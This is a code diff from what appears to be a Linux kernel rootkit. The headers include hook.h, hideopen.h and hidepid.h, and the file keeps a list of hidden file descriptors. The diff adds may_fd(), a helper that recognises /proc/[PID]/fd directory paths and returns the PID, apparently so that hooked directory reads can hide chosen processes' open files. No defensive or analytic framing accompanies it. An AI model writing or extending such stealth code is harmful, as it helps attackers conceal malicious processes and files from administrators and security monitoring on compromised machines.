@@ -1,8 +1,12 @@
 #include <linux/slab.h>
 #include <linux/fd.h>
 
+#include "common.h"
 #include "hook.h"
 #include "hideopen.h"
+#include "hidepid.h"
+
+const char *dir_sep = "/";
 
 fd_list_t hidden_fds = {
     .fd  = -1,
@@ -11,6 +15,57 @@ fd_list_t hidden_fds = {
 };
 
 fd_list_t_ptr hidden_fds_tail = &hidden_fds;
+
+//Returns pid on success, -1 on failure
+pid_t
+may_fd(struct file *dirfile)
+{
+    pid_t tmp = -1;
+    char *buf;
+
+    buf = kzalloc(512, GFP_KERNEL);
+
+    if(dirfile && !strcmp(dirfile->f_path.dentry->d_name.name, "fd")) {
+        char *path = d_path(&dirfile->f_path, buf, 512);
+
+        if(!IS_ERR(path)) {
+            char *sub;
+            char *cur = path;
+
+            /**
+             * In the correct directory, the tokens are as follows:
+             * {NULL, proc, [PID], fd}
+             * We also don't want the task directory, so the third
+             * token should be fd, not task
+             **/
+            int i = 0;
+
+            while((sub = strsep(&cur, dir_sep))) {
+                switch(i++) {
+                    case 1:
+                        if(strcmp(sub, "proc"))
+                            goto leave;
+                        break;
+                    case 2:
+                        tmp = PID_FROM_NAME(sub);
+                        break;
+                    case 3:
+                        if(!strcmp(sub, "fd")) {
+                            kfree(buf);
+                            return tmp;
+                        } else
+                            goto leave;
+                    default:
+                        break;
+                }
+            }
+        }
+    }
+
+    leave:
+    kfree(buf);
+    return -1;
+}
 
 void
 clear_hidden_fds(void)
